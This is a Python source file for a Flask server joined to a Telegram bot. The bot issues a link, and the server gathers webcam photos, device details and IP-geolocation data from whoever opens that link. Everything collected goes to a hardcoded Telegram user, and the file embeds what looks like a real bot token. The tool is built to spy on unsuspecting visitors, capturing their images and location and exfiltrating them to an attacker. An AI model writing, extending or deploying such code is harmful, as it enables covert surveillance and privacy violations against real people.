from flask import Flask, render_template, render_template_string, request, jsonify, session
import logging
import os
import json
import datetime
import telebot
import time
import os
import threading
import base64
import requests

app = Flask(__name__, template_folder='.site', static_folder='.site', static_url_path='/')





bot = telebot.TeleBot("7525871760:AAGj7NTUIxNTDq_JpBqQF3E7PvGnk8MtgT8")
channel_id = '@hackerpdfbotlog'

user_id = 1853412532
host = ""



def message(message):
    try:
            bot.send_message(user_id, message, parse_mode="Markdown")
            print(f"Message sent to {user_id}")
    except Exception as e:
            print(f"Failed to send message to {user_id}: {str(e)}")





@bot.message_handler(commands=['start'])
def send_(message):
    bot.reply_to(message, """

    /start - Start bot \n /link - generate  link \n
     """)


@bot.message_handler(commands=['link'])
def send_welcome(message):
    bot.reply_to(message, f"""
     your link  :- {host}
     """)


def ipdata(ip):
    data = requests.get(f"http://ip-api.com/json/{ip}")
    return data.json()




# Function to send a photo to all users
def photo(photo_path, caption=""):
    #    for user_id in user_ids:
        try:
            # Send the photo
            bot.send_photo(user_id, photo=photo_path, caption=caption)
            print(f"Photo sent to {user_id}")
            time.sleep(1)  # Sleep for 1 second to avoid hitting rate limits
        except Exception as e:
            print(f"Failed to send photo to {user_id}: {str(e)}")


    


def now():
    now = datetime.datetime.now()
    print(now)
    return now



def makefile(data, file_name):
    with open(file_name, 'w') as file:  
       file.write(data)


def jdata(data):
   d = json.dumps(data, indent=9)
   return d



@app.route("/")
def hello():
    return render_template("index.html")



@app.route("/cam")
def he():
    return render_template("video.html")


@app.route('/data', methods=['POST', 'GET'])
def upload_image():
    data = request.get_json()
    image_data = data['image']
    global file
    print("photo")
    decoded_image_data = base64.b64decode(image_data)
#    file = f"data/{ran()}.jpg"
    time = now()
    photo(decoded_image_data, time)
    return jsonify({"message": "Image uploaded successfully!"})







@app.route('/api', methods=['POST', 'GET'])
def devi():
    data = request.get_json()
    io = jdata(data)
    m = f"""
    this user device data info

    ```
    {io}
    ```
    """
    message(m)
    return jsonify(data)



@app.route('/ip', methods=['POST', 'GET'])
def ip():
    data = request.get_json()
    hi = jdata(data)
    ip = data['ip']
    ha6 = jdata(ipdata(ip))
    m =f"""
    this is user ip addres data \n
    
    ```
    {ha6}
    ```

    """
    message(m)
    return jsonify(data)



def Bot():
  bot.polling(none_stop=True)

def ser():
  app.run(port=6099)





if __name__ == '__main__':
    # Start Flask app in a new thread
    flask_thread = threading.Thread(target=ser)
    flask_thread.start()

    # Start Telegram bot in the main thread
    Bot()


  





